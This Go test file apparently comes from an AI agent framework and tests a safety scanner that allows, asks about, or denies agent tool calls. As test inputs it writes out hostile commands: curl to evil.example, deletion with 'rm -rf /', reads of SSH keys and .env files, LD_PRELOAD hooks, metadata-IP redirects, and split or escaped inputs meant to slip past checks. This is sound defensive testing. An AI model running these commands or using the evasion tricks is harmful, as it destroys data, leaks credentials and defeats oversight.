//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
)

func TestDefaultScanner_AcceptanceCases(t *testing.T) {
	scanner := MustDefaultScanner(Policy{
		NetworkAllowlist: []string{"proxy.golang.org", ".golang.org"},
	})
	cases := []struct {
		name     string
		req      ScanRequest
		decision Decision
		ruleID   string
		blocked  bool
		redacted bool
	}{
		{
			name: "safe_go_test",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "go test ./...",
			},
			decision: DecisionAllow,
			ruleID:   "evaluation.none",
		},
		{
			name: "dangerous_rm_rf",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "rm -rf /tmp/x",
			},
			decision: DecisionDeny, ruleID: "command.dangerous_delete",
			blocked: true,
		},
		{
			name: "read_ssh_key",
			req: ScanRequest{
				ToolName: "exec_command", Backend: BackendHost,
				Command: "cat ~/.ssh/id_rsa",
			},
			decision: DecisionDeny, ruleID: "path.sensitive_credentials",
			blocked: true, redacted: true,
		},
		{
			name: "read_env_file",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "cat .env",
			},
			decision: DecisionDeny, ruleID: "path.secret_file",
			blocked: true, redacted: true,
		},
		{
			name: "network_non_allowlisted",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "curl https://evil.example/a.sh",
			},
			decision: DecisionDeny, ruleID: "network.non_allowlisted_domain",
			blocked: true,
		},
		{
			name: "network_allowlisted",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "curl https://proxy.golang.org",
			},
			decision: DecisionAllow,
			ruleID:   "evaluation.none",
		},
		{
			name: "shell_wrapper_bypass",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "sh -c 'curl https://evil.example'",
			},
			decision: DecisionDeny, ruleID: "shell.wrapper",
			blocked: true,
		},
		{
			name: "command_substitution",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "echo $(cat .env)",
			},
			decision: DecisionDeny, ruleID: "shell.expansion",
			blocked: true, redacted: true,
		},
		{
			name: "pipeline_mixed",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "echo ok | wc -c",
			},
			decision: DecisionAllow,
			ruleID:   "evaluation.none",
		},
		{
			name: "dependency_install",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "npm install left-pad",
			},
			decision: DecisionAsk, ruleID: "dependency.install",
			blocked: true,
		},
		{
			name: "long_sleep",
			req: ScanRequest{
				ToolName: "exec_command", Backend: BackendHost,
				Command: "sleep 99999",
			},
			decision: DecisionDeny, ruleID: "resource.long_running",
			blocked: true,
		},
		{
			name: "large_output",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "yes | head -n 1000000",
			},
			decision: DecisionAsk, ruleID: "resource.large_output",
			blocked: true,
		},
		{
			name: "host_pty",
			req: ScanRequest{
				ToolName: "exec_command", Backend: BackendHost,
				Command: "python -i", TTY: true,
			},
			decision: DecisionAsk, ruleID: "host.pty_session",
			blocked: true,
		},
		{
			name: "human_review_custom",
			req: ScanRequest{
				ToolName: "custom_downloader", Backend: BackendUnknown,
				RawArguments: []byte(`{"text":"download https://example.invalid/a.sh"}`),
			},
			decision: DecisionNeedsHumanReview, ruleID: "unknown.requires_review",
			blocked: true,
		},
		{
			name: "unknown_dangerous_command",
			req: ScanRequest{
				ToolName: "mcp_call", Backend: BackendUnknown,
				RawArguments: []byte(`{"cmd":"rm -rf /tmp/x"}`),
			},
			decision: DecisionNeedsHumanReview, ruleID: "unknown.dangerous_command",
			blocked: true,
		},
		{
			name: "unknown_sensitive_path",
			req: ScanRequest{
				ToolName: "mcp_call", Backend: BackendUnknown,
				RawArguments: []byte(`{"path":"~/.ssh/id_rsa"}`),
			},
			decision: DecisionNeedsHumanReview, ruleID: "unknown.sensitive_path",
			blocked: true, redacted: true,
		},
		{
			name: "unknown_json_secret",
			req: ScanRequest{
				ToolName: "mcp_call", Backend: BackendUnknown,
				RawArguments: []byte(`{"token":"abc123"}`),
			},
			decision: DecisionDeny, ruleID: "secret.inline_value",
			blocked: true, redacted: true,
		},
		{
			name: "argv_only_dangerous_delete",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Args: []string{"rm", "-rf", "/tmp/x"},
			},
			decision: DecisionDeny, ruleID: "command.dangerous_delete",
			blocked: true,
		},
		{
			name: "argv_only_sensitive_path",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Args: []string{"cat", "~/.ssh/id_rsa"},
			},
			decision: DecisionDeny, ruleID: "path.sensitive_credentials",
			blocked: true, redacted: true,
		},
		{
			name: "argv_only_network",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Args: []string{"curl", "evil.example"},
			},
			decision: DecisionDeny, ruleID: "network.non_allowlisted_domain",
			blocked: true,
		},
		{
			name: "metadata_output_limit",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "echo ok",
				Metadata: map[string]any{
					"max_result_size": int64(2 << 20),
				},
			},
			decision: DecisionAsk, ruleID: "resource.output_limit",
			blocked: true,
		},
		{
			name: "cwd_relative_sensitive_path",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "cat id_rsa", Cwd: "~/.ssh",
			},
			decision: DecisionDeny, ruleID: "path.sensitive_credentials",
			blocked: true, redacted: true,
		},
		{
			name: "sensitive_cwd_no_argument_command",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "ls", Cwd: "~/.ssh",
			},
			decision: DecisionDeny, ruleID: "path.sensitive_credentials",
			blocked: true, redacted: true,
		},
		{
			name: "stdin_dangerous_delete",
			req: ScanRequest{
				ToolName: "exec_command", Backend: BackendHost,
				Command: "cat", Stdin: "rm -rf /tmp/x",
			},
			decision: DecisionDeny, ruleID: "command.dangerous_delete",
			blocked: true,
		},
		{
			name: "codeexec_python_network_private_address",
			req: ScanRequest{
				ToolName: "execute_code", Backend: BackendCodeExec,
				Language: "python", Code: `import urllib.request
urllib.request.urlopen("http://127.0.0.1:8080/debug")`,
			},
			decision: DecisionDeny, ruleID: "network.private_address",
			blocked: true,
		},
		{
			name: "rm_relative_path_is_review",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "rm build/output.o",
			},
			decision: DecisionDeny, ruleID: "command.policy",
			blocked: true,
		},
		{
			name: "sleep_duration_suffix",
			req: ScanRequest{
				ToolName: "exec_command", Backend: BackendHost,
				Command: "sleep 10m",
			},
			decision: DecisionAsk, ruleID: "resource.long_running",
			blocked: true,
		},
		{
			name: "yes_head_substring_no_large_output",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "grep yes headfile.txt",
			},
			decision: DecisionAllow, ruleID: "evaluation.none",
		},
		{
			name: "multiline_shell_control_flow_denied",
			req: ScanRequest{
				ToolName: "execute_code", Backend: BackendCodeExec,
				Language: "bash", Code: "if true; then\ncurl https://evil.example\nfi",
			},
			decision: DecisionDeny, ruleID: "network.non_allowlisted_domain",
			blocked: true,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(context.Background(), tc.req)
			require.NoError(t, err)
			require.Equal(t, tc.decision, report.Decision)
			require.Equal(t, tc.ruleID, report.RuleID)
			require.Equal(t, tc.blocked, report.Blocked)
			require.Equal(t, tc.redacted, report.Redacted)
			require.NotEmpty(t, report.Evidence)
			require.NotEmpty(t, report.Recommendation)
		})
	}
}

func TestDefaultScanner_EnvAllowlistBlocksUnknownEnv(t *testing.T) {
	scanner := MustDefaultScanner(Policy{
		EnvAllowlist: []string{"PATH"},
	})
	report, err := scanner.Scan(context.Background(), ScanRequest{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspace,
		Command:  "go test ./...",
		Env: map[string]string{
			"PATH":       "/usr/bin",
			"LD_PRELOAD": "/tmp/hook.so",
		},
	})
	require.NoError(t, err)
	require.Equal(t, DecisionDeny, report.Decision)
	require.Equal(t, "env.process_control", report.RuleID)
	require.True(t, report.Blocked)
}

func TestDefaultScanner_RejectsUnsupportedBackend(t *testing.T) {
	report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
		ToolName:   "exec_command",
		Backend:    Backend("HOST"),
		Command:    "python -i",
		Background: true,
		TTY:        true,
	})
	require.NoError(t, err)
	require.Equal(t, BackendUnknown, report.Backend)
	require.Equal(t, DecisionDeny, report.Decision)
	require.Equal(t, RiskCritical, report.RiskLevel)
	require.Equal(t, "backend.unsupported", report.RuleID)
	require.True(t, report.Blocked)
	require.Contains(t, report.Evidence, `unsupported backend "HOST"`)
}

func TestDefaultScanner_DeniesProcessControlEnvWithoutAllowlist(t *testing.T) {
	report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
		ToolName: "exec_command",
		Backend:  BackendHost,
		Command:  "echo ok",
		Env: map[string]string{
			"PATH":       "/tmp/attacker/bin",
			"LD_PRELOAD": "/tmp/hook.so",
		},
	})
	require.NoError(t, err)
	require.Equal(t, DecisionDeny, report.Decision)
	require.Equal(t, "env.process_control", report.RuleID)
	require.True(t, report.Blocked)
}

func TestDefaultScanner_DoesNotApplyCommandAllowlistToStdinData(t *testing.T) {
	scanner := MustDefaultScanner(Policy{
		AllowedCommands: []string{"cat"},
	})

	t.Run("benign stdin remains allowed", func(t *testing.T) {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "cat",
			Stdin:    "hello",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAllow, report.Decision)
		require.Equal(t, "evaluation.none", report.RuleID)
		require.False(t, report.Blocked)
	})

	t.Run("dangerous stdin is still scanned", func(t *testing.T) {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "cat",
			Stdin:    "rm -rf /",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision)
		require.Equal(t, "command.dangerous_delete", report.RuleID)
		require.True(t, report.Blocked)
	})
}

func TestDefaultScanner_DetectsCodeResourceAbuse(t *testing.T) {
	seconds, ok := codeSleepSeconds("go", "time.Sleep(1 * time.Hour)")
	require.True(t, ok)
	require.Equal(t, 3600, seconds)
	cases := []struct {
		name     string
		language string
		code     string
		decision Decision
	}{
		{name: "python infinite loop", language: "python", code: "while True:\n    pass", decision: DecisionDeny},
		{name: "go infinite loop", language: "go", code: "for {}", decision: DecisionDeny},
		{name: "javascript infinite loop", language: "javascript", code: "while (true) {}", decision: DecisionDeny},
		{name: "python long sleep", language: "python", code: "import time\ntime.sleep(3600)", decision: DecisionDeny},
		{name: "go long sleep", language: "go", code: "time.Sleep(1 * time.Hour)", decision: DecisionDeny},
		{name: "javascript long sleep", language: "javascript", code: "setTimeout(resolve, 3600000)", decision: DecisionDeny},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
				ToolName: "execute_code",
				Backend:  BackendCodeExec,
				Language: tc.language,
				Code:     tc.code,
			})
			require.NoError(t, err)
			require.Equal(t, tc.decision, report.Decision)
			require.Equal(t, "resource.long_running", report.RuleID)
			require.True(t, report.Blocked)
		})
	}
}

func TestDefaultScanner_DetectsDependencyInstallVariants(t *testing.T) {
	scanner := MustDefaultScanner(Policy{})
	for _, command := range []string{
		"python -m pip install package",
		"python -m pip --quiet install package",
		"npm --silent install package",
		"npm --prefix /tmp install package",
		"pip --no-cache-dir install package",
	} {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  command,
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAsk, report.Decision, command)
		require.Equal(t, "dependency.install", report.RuleID, command)
	}
}

func TestDefaultScanner_EdgeCoverageCases(t *testing.T) {
	t.Run("nil scanner uses defaults", func(t *testing.T) {
		var scanner *DefaultScanner
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "go test ./tool/safety",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAllow, report.Decision)
	})

	t.Run("cancelled context asks before scanning", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		cancel()
		report, err := MustDefaultScanner(Policy{}).Scan(ctx, ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "go test ./tool/safety",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAsk, report.Decision)
		require.Equal(t, "scanner.context_cancelled", report.RuleID)
	})

	t.Run("oversized command and script require review", func(t *testing.T) {
		scanner := MustDefaultScanner(Policy{
			MaxCommandBytes: 4,
			MaxScriptBytes:  4,
		})
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName: "execute_code",
			Backend:  BackendCodeExec,
			Language: "python",
			Code:     "print('too long')",
			Command:  "echo too long",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionNeedsHumanReview, report.Decision)
		require.Contains(t, []string{"command.too_large", "script.too_large"}, report.RuleID)
	})

	t.Run("timeout host request denies", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{MaxTimeoutSec: 5}).Scan(
			context.Background(),
			ScanRequest{
				ToolName:   "exec_command",
				Backend:    BackendHost,
				Command:    "go test ./tool/safety",
				TimeoutSec: 6,
			},
		)
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision)
		require.Equal(t, "resource.long_running", report.RuleID)
	})

	t.Run("host background asks", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
			ToolName:   "exec_command",
			Backend:    BackendHost,
			Command:    "go test ./tool/safety",
			Background: true,
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAsk, report.Decision)
		require.Equal(t, "host.background_process", report.RuleID)
	})

	t.Run("relative delete asks instead of critical delete", func(t *testing.T) {
		scanner := MustDefaultScanner(Policy{
			DeniedCommands:       []string{},
			DeniedPaths:          []string{},
			DisableDefaultDenies: true,
		})
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "rm build/output.o",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAsk, report.Decision)
		require.Equal(t, "command.delete", report.RuleID)
	})
}

func TestDefaultScanner_NetworkAndCodeEdges(t *testing.T) {
	t.Run("network allowlist applies to git clone", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{
			NetworkAllowlist: []string{"allowed.example"},
		}).Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "git clone https://evil.example/repo",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision)
		require.Equal(t, "network.non_allowlisted_domain", report.RuleID)
	})

	t.Run("network allowlist applies to interpreter URL calls", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{
			NetworkAllowlist: []string{"allowed.example"},
		}).Scan(context.Background(), ScanRequest{
			ToolName: "execute_code",
			Backend:  BackendCodeExec,
			Language: "python",
			Code:     `import urllib.request; urllib.request.urlopen("https://evil.example")`,
		})
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision)
		require.Equal(t, "network.non_allowlisted_domain", report.RuleID)
	})

	t.Run("curl destination override is denied with allowlist", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{
			NetworkAllowlist: []string{"allowed.example"},
		}).Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "curl --resolve allowed.example:443:169.254.169.254 https://allowed.example",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision)
		require.Equal(t, "network.destination_override", report.RuleID)
	})

	t.Run("curl destination override asks without allowlist", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "curl --connect-to allowed.example:443:169.254.169.254:443 https://allowed.example",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAsk, report.Decision)
		require.Equal(t, "network.destination_override", report.RuleID)
	})

	t.Run("allowlisted URL credentials are denied and redacted", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{
			NetworkAllowlist: []string{"allowed.example"},
		}).Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "curl https://alice:s3cr3t@allowed.example/path",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision)
		require.Equal(t, "secret.inline_value", report.RuleID)
		require.True(t, report.Redacted)
		require.NotContains(t, report.Command, "alice")
		require.NotContains(t, report.Command, "s3cr3t")
		encoded, err := json.Marshal(report)
		require.NoError(t, err)
		require.NotContains(t, string(encoded), "s3cr3t")
	})

	t.Run("benign token metadata is not a secret", func(t *testing.T) {
		for _, raw := range []string{
			`{"max_tokens":128}`,
			`{"token_count":42}`,
			`{"authorization_required":false}`,
		} {
			report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
				ToolName:     "mcp_call",
				Backend:      BackendUnknown,
				RawArguments: []byte(raw),
			})
			require.NoError(t, err)
			require.Equal(t, DecisionAllow, report.Decision, raw)
			require.Equal(t, "evaluation.none", report.RuleID, raw)
		}
	})

	t.Run("network command without URL asks", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "curl example.invalid",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAsk, report.Decision)
		require.Equal(t, "network.external_domain", report.RuleID)
	})

	t.Run("ssh without URL denies", func(t *testing.T) {
		scanner := MustDefaultScanner(Policy{
			DeniedCommands:       []string{},
			DeniedPaths:          []string{},
			DisableDefaultDenies: true,
		})
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "ssh example.invalid",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision)
		require.Equal(t, "network.external_tool", report.RuleID)
	})

	t.Run("schemeless network host obeys strict allowlist", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{
			NetworkAllowlist: []string{"proxy.golang.org"},
		}).Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "curl example.invalid",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision)
		require.Equal(t, "network.non_allowlisted_domain", report.RuleID)
	})

	t.Run("schemeless allowlisted suffix host is skipped", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{
			NetworkAllowlist: []string{".example.com"},
		}).Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "curl api.example.com",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAllow, report.Decision)
	})

	t.Run("schemeless host port obeys strict allowlist", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{
			NetworkAllowlist: []string{"proxy.golang.org"},
		}).Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "curl evil.example:443/path",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision)
		require.Equal(t, "network.non_allowlisted_domain", report.RuleID)
	})

	t.Run("schemeless host port allowlisted is skipped", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{
			NetworkAllowlist: []string{"allowed.example"},
		}).Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "wget allowed.example:443/file",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAllow, report.Decision)
	})

	t.Run("write stdin fragment requires review", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
			ToolName: "write_stdin",
			Backend:  BackendHost,
			Stdin:    "cu",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionNeedsHumanReview, report.Decision)
		require.Equal(t, "stdin.session_fragment", report.RuleID)
	})

	t.Run("split write stdin submitted chunks require review", func(t *testing.T) {
		scanner := MustDefaultScanner(Policy{})
		for _, args := range [][]byte{
			[]byte(`{"chars":"cu"}`),
			[]byte(`{"chars":"rl https://evil.example\n","append_newline":true}`),
		} {
			reqs, err := requestsFromToolCall("write_stdin", "call-1", "", args, nil)
			require.NoError(t, err)
			require.Len(t, reqs, 1)

			report, err := scanner.Scan(context.Background(), reqs[0])
			require.NoError(t, err)
			require.Equal(t, DecisionNeedsHumanReview, report.Decision)
			require.Equal(t, "stdin.session_fragment", report.RuleID)
		}
	})

	t.Run("skill execution tools use scanner command rules", func(t *testing.T) {
		scanner := MustDefaultScanner(Policy{
			NetworkAllowlist: []string{"proxy.golang.org"},
		})
		cases := []struct {
			toolName string
			args     []byte
			ruleID   string
			decision Decision
		}{
			{
				toolName: "skill_run",
				args:     []byte(`{"command":"curl https://evil.example","workdir":"."}`),
				ruleID:   "network.non_allowlisted_domain",
				decision: DecisionDeny,
			},
			{
				toolName: "skill_exec",
				args:     []byte(`{"command":"npm install left-pad","cwd":"."}`),
				ruleID:   "dependency.install",
				decision: DecisionAsk,
			},
		}
		for _, tc := range cases {
			reqs, err := requestsFromToolCall(tc.toolName, "call-1", "", tc.args, nil)
			require.NoError(t, err)
			require.Len(t, reqs, 1)

			report, err := scanner.Scan(context.Background(), reqs[0])
			require.NoError(t, err)
			require.Equal(t, tc.decision, report.Decision)
			require.Equal(t, tc.ruleID, report.RuleID)
		}
	})

	t.Run("external network without strict allowlist asks", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "curl https://example.invalid/file",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAsk, report.Decision)
		require.Equal(t, "network.external_domain", report.RuleID)
	})

	t.Run("allowed suffix host is skipped", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{
			NetworkAllowlist: []string{".example.com"},
		}).Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  "curl https://api.example.com/file",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAllow, report.Decision)
	})

	t.Run("code with missing language asks", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
			ToolName: "execute_code",
			Backend:  BackendCodeExec,
			Code:     "print(1)",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAsk, report.Decision)
		require.Equal(t, "codeexec.unsupported_language", report.RuleID)
	})

	t.Run("python subprocess asks", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
			ToolName: "execute_code",
			Backend:  BackendCodeExec,
			Language: "python",
			Code:     "import subprocess\nsubprocess.run(['go', 'version'])",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAsk, report.Decision)
		require.Equal(t, "codeexec.subprocess", report.RuleID)
	})

	t.Run("unsupported language asks", func(t *testing.T) {
		report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
			ToolName: "execute_code",
			Backend:  BackendCodeExec,
			Language: "ruby",
			Code:     "puts 1",
		})
		require.NoError(t, err)
		require.Equal(t, DecisionAsk, report.Decision)
		require.Equal(t, "codeexec.unsupported_language", report.RuleID)
	})
}

func TestDefaultScanner_UnknownArgumentsAndSensitivePathRegressions(t *testing.T) {
	scanner := MustDefaultScanner(Policy{})

	t.Run("unknown arguments dedupe raw and decoded findings", func(t *testing.T) {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName:     "mcp_call",
			Backend:      BackendUnknown,
			RawArguments: []byte(`{"command":"rm -rf /"}`),
		})
		require.NoError(t, err)
		require.Equal(t, DecisionNeedsHumanReview, report.Decision)
		require.Equal(t, "unknown.dangerous_command", report.RuleID)
		require.Len(t, report.Findings, 1)
		require.Equal(t, Finding{
			RuleID:         "unknown.dangerous_command",
			RiskLevel:      RiskCritical,
			Decision:       DecisionNeedsHumanReview,
			Evidence:       "unknown tool contains dangerous command-like content",
			Recommendation: "review unknown open-world tools before execution",
			Redacted:       false,
		}, report.Findings[0])
	})

	t.Run("unknown arguments decode escaped dangerous command", func(t *testing.T) {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName:     "mcp_call",
			Backend:      BackendUnknown,
			RawArguments: []byte(`{"command":"rm\u0020-rf\u0020/"}`),
		})
		require.NoError(t, err)
		require.Equal(t, DecisionNeedsHumanReview, report.Decision)
		require.Equal(t, "unknown.dangerous_command", report.RuleID)
	})

	t.Run("unknown arguments decode escaped URL and sensitive path", func(t *testing.T) {
		urlReport, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName:     "mcp_call",
			Backend:      BackendUnknown,
			RawArguments: []byte(`{"url":"https:\/\/evil.example\/a.sh"}`),
		})
		require.NoError(t, err)
		require.Equal(t, DecisionNeedsHumanReview, urlReport.Decision)
		require.Equal(t, "unknown.requires_review", urlReport.RuleID)

		pathReport, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName:     "mcp_call",
			Backend:      BackendUnknown,
			RawArguments: []byte(`{"path":"\/etc\/passwd"}`),
		})
		require.NoError(t, err)
		require.Equal(t, DecisionNeedsHumanReview, pathReport.Decision)
		require.Equal(t, "unknown.sensitive_path", pathReport.RuleID)
		require.True(t, pathReport.Redacted)
	})

	t.Run("unknown arguments decode escaped dangerous command key", func(t *testing.T) {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName:     "mcp_call",
			Backend:      BackendUnknown,
			RawArguments: []byte(`{"rm\u0020-rf\u0020/":true}`),
		})
		require.NoError(t, err)
		require.Equal(t, DecisionNeedsHumanReview, report.Decision)
		require.Equal(t, "unknown.dangerous_command", report.RuleID)
		require.Len(t, report.Findings, 1)
		require.Equal(t, "unknown.dangerous_command", report.Findings[0].RuleID)
	})

	t.Run("unknown arguments decode escaped sensitive path key", func(t *testing.T) {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName:     "mcp_call",
			Backend:      BackendUnknown,
			RawArguments: []byte(`{"\/home\/user\/.ssh\/id_rsa":"x"}`),
		})
		require.NoError(t, err)
		require.Equal(t, DecisionNeedsHumanReview, report.Decision)
		require.Equal(t, "unknown.sensitive_path", report.RuleID)
		require.True(t, report.Redacted)
		require.Len(t, report.Findings, 1)
		require.Equal(t, "unknown.sensitive_path", report.Findings[0].RuleID)
	})

	t.Run("unknown arguments decode object keys in sorted deterministic order", func(t *testing.T) {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName: "mcp_call",
			Backend:  BackendUnknown,
			RawArguments: []byte(
				`{"rm\u0020-rf\u0020/":true,"\/home\/user\/.ssh\/id_rsa":"x"}`,
			),
		})
		require.NoError(t, err)
		require.Equal(t, DecisionNeedsHumanReview, report.Decision)
		require.Equal(t, "unknown.sensitive_path", report.RuleID)
		require.True(t, report.Redacted)
		require.Len(t, report.Findings, 2)
		require.Equal(t, "unknown.sensitive_path", report.Findings[0].RuleID)
		require.Equal(t, "unknown.dangerous_command", report.Findings[1].RuleID)
	})

	t.Run("unknown arguments decode nested object array strings recursively", func(t *testing.T) {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName:     "mcp_call",
			Backend:      BackendUnknown,
			RawArguments: []byte(`{"outer":[{"inner":{"command":"rm\u0020-rf\u0020/"}}]}`),
		})
		require.NoError(t, err)
		require.Equal(t, DecisionNeedsHumanReview, report.Decision)
		require.Equal(t, "unknown.dangerous_command", report.RuleID)
		require.Len(t, report.Findings, 1)
		require.Equal(t, "unknown tool contains dangerous command-like content", report.Findings[0].Evidence)
	})

	t.Run("oversized unknown arguments return bounded scan finding without decode", func(t *testing.T) {
		scanner := MustDefaultScanner(Policy{MaxCommandBytes: 32})
		rawArguments := []byte(`{"command":"rm\u0020-rf\u0020/","padding":"` + strings.Repeat("a", 64) + `"}`)

		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName:     "mcp_call",
			Backend:      BackendUnknown,
			RawArguments: rawArguments,
		})
		require.NoError(t, err)
		require.Equal(t, DecisionNeedsHumanReview, report.Decision)
		require.Equal(t, "unknown.bounded_scan", report.RuleID)
		require.False(t, report.Redacted)
		require.Len(t, report.Findings, 1)
		require.Equal(t, Finding{
			RuleID:         "unknown.bounded_scan",
			RiskLevel:      RiskHigh,
			Decision:       DecisionNeedsHumanReview,
			Evidence:       fmt.Sprintf("raw arguments have %d bytes, exceeds max_command_bytes=32", len(rawArguments)),
			Recommendation: "review large unknown tool arguments manually before execution",
			Redacted:       false,
		}, report.Findings[0])
		require.NotContains(t, report.Evidence, `rm\u0020-rf\u0020/`)
		require.NotContains(t, report.Evidence, strings.Repeat("a", 16))
	})

	t.Run("normalized sensitive paths are denied", func(t *testing.T) {
		for _, command := range []string{
			"cat /etc/./passwd",
			"cat /etc//passwd",
		} {
			report, err := scanner.Scan(context.Background(), ScanRequest{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspace,
